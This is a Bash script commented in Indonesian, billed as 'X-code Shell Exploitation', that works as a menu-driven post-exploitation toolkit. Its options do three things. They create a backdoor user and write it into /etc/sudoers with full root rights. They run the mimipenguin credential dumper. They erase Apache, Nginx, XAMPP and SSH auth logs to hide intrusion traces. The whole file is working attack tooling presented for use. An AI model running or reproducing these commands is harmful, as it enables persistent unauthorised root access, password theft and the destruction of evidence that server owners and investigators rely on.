#!/bin/bash
#Progammer : Kurniawan. trainingxcode@gmail.com. xcode.or.id.
#Program ini dapat digunakan untuk personal ataupun komersial.
#X-code Media - xcode.or.id / xcodetraining.com
again='y'
while [[ $again == 'Y' ]] || [[ $again == 'y' ]];
do
clear
echo "=================================================================";
echo " X-code Shell Exploitation                                       ";
echo " Progammer : Kurniawan. xcode.or.id                              ";
echo " Version 0.3 - 09/05/2020                                        ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Membuat backdoor account                                        ";
echo " [1]  Cek apakah server menggunakan ubuntu / linux mint / lainnya";
echo " [2]  Tambah user di linux                                       ";
echo " [3]  Lihat user di linux di /etc/passwd                         ";
echo " [4]  Jadikan user di linux mempunyai akses root                 ";
echo " [5]  Cek apakah user sudah ada di /etc/sudoers                  ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Mimipenguin                                                     ";
echo " [6] Jalankan mimipenguin                                        ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Penghapusan log                                                 ";
echo " [7]  Cek semua log yang ada di server                           ";
echo " [8]  Cek isi semua log yang ada di server                       ";
echo " [9]  Cara cek log history                                       ";
echo " [10] Menghapus log akses apache2 /var/log/apache2/access*       ";
echo " [11] Menghapus log akses nginx /var/log/apache2/access*         ";
echo " [12] Menghapus log akses apache XAMPP /opt/lampp/logs/apache*   ";
echo " [13] Menghapus log akses SSH /var/log/auth.log                  ";
echo " [14] Cara menghapus log history                                 ";
echo " [15] Menghapus semua log server                                 ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " [16] Exit                                                       ";
echo "=================================================================";
read -p " Masukkan Nomor Pilihan Anda antara [1 - 16] : " choice;
echo "";
case $choice in
1)  sudo lsb_release -a
    ;;
2)  echo -n "Masukkan nama user yang akan ditambah : "
    read namauser
    sudo useradd $namauser
    passwd $namauser
    ;;
3)  sudo cat /etc/passwd
    ;;
4)  echo -n "Masukkan nama user yang akan diberikan akses root : "
    read namauser
    sed -i "/more/i\\"$namauser" ALL=(ALL:ALL) ALL" /etc/sudoers
    ;;
5)  sudo cat /etc/sudoers
    ;;
6)  echo "Harap ditunggu, mimipenguin sedang bekerja.." 
    ./mimipenguin/mimipenguin.sh
    ;;
7)  if [ -z "$(ls -A /var/log/apache2/access*)" ]; then
    echo "Tidak terdeteksi access.log untuk apache2"
    else
    sudo ls -l /var/log/apache2/access*
    echo "Terdeteksi ada file access.log untuk apache2"
    fi
    if [ -z "$(ls -A /var/log/nginx/access*)" ]; then
    echo "Tidak terdeteksi access.log untuk Nginx"
    else
    sudo ls -l /var/log/nginx/access.log* 
    echo "Terdeteksi ada file access.log untuk Nginx"
    fi
    if [ -z "$(ls -A /opt/lampp/logs/access*)" ]; then
    echo "Tidak terdeteksi access_log untuk Apache2 XAMPP"
    else
    sudo ls -l /opt/lampp/logs/access_log 
    echo "Terdeteksi file access_log untuk Apache2 XAMPP"
    fi
    if [ -z "$(ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi auth.log untuk SSH"
    else
    sudo ls -l /var/log/auth.log
    echo "Terdeteksi ada file auth.log untuk SSH"
    fi
    ;;

8)  if [ -z "$(ls -A /var/log/apache2/access*)" ]; then
    echo "Tidak terdeteksi access.log untuk apache2"
    else
    sudo cat /var/log/apache2/access* | more
    fi
    if [ -z "$(ls -A /var/log/nginx/access*)" ]; then
    echo "Tidak terdeteksi access.log untuk Nginx"
    else
    sudo cat /var/log/nginx/access.log* | more
    fi
    if [ -z "$(ls -A /opt/lampp/etc/logs/access*)" ]; then
    echo "Tidak terdeteksi access_log Apache pada XAMPP"
    else
    sudo cat /opt/lampp/logs/access_log | more
    fi
    if [ -z "$(ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi auth.log pada SSH Server"
    else
    sudo cat /var/log/auth.log | more
    fi
    ;;

9)  sudo cat txt/history.txt
    ;;
   
10)  sudo cat /var/log/apache2/access.log
    read -p "Apakah anda mau yakin mau mengosongkan /var/log/apache2/access*? y/n :" -n 1 -r
    echo  ""
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    if [ -z "$(ls -A /var/log/apache2/access.log)" ]; then
    echo "Tidak terdeteksi access.log untuk apache2"
    else
    sudo rm /var/log/apache2/access*
    sudo echo > /var/log/apache2/access.log
    fi
    fi
    ;;

11)  sudo cat /var/log/nginx/access.log
    read -p "Apakah anda mau yakin mau mengosongkan /var/log/nginx/access* ? y/n :" -n 1 -r
    echo  ""
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    if [ -z "$(ls -A /var/log/nginx/access.log)" ]; then
    echo "Tidak terdeteksi access.log untuk nginx"
    else
    sudo rm /var/log/nginx/access*
    sudo echo > /var/log/nginx/access.log
    fi
    fi
    ;;

12) sudo cat /opt/lampp/logs/access_log
    read -p "Apakah anda mau yakin mau mengosongkan /opt/lampp/logs/access* pada apache2 - XAMPP ? y/n :" -n 1 -r
    echo  ""
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    if [ -z "$(ls -A /opt/lampp/etc/logs/access_log)" ]; then
    echo "Tidak terdeteksi access_log untuk apache2 - XAMPP"
    else
    sudo rm /opt/lampp/logs/access*
    sudo echo > /opt/lampp/logs/access_log
    fi
    fi
    ;;

13) sudo cat /var/log/auth.log
    read -p "Apakah anda mau yakin mau mengosongkan /var/log/auth.log ? y/n :" -n 1 -r
    echo  ""
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    if [ -z "$(ls -A /var/log/auth.log)" ]; then
    echo "Tidak terdeteksi auth.log untuk SSH"
    else
    sudo echo > /var/log/auth.log
    fi
    fi
    ;;

14) sudo cat txt/delhistory.txt
    ;;

15) read -p "Apakah anda mau yakin mau mengosongkan semua log ? y/n :" -n 1 -r
    echo  ""
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    sudo rm /var/log/apache2/access*
    sudo echo > /var/log/apache2/access.log
    sudo rm /var/log/nginx/access*
    sudo echo > /var/log/nginx/access.log
    sudo rm /opt/lampp/logs/access*
    sudo echo > /opt/lampp/xampp/logs/access_log
    sudo echo > /var/log/auth.log
    fi
    ;;

16) exit
    ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "X-code Shell Exploitation"
echo "Oleh Kurniawan - trainingxcode@gmail.com. xcode.or.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [[ $again != 'Y' ]] && [[ $again != 'y' ]] && [[ $again != 'N' ]] && [[ $again != 'n' ]];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done
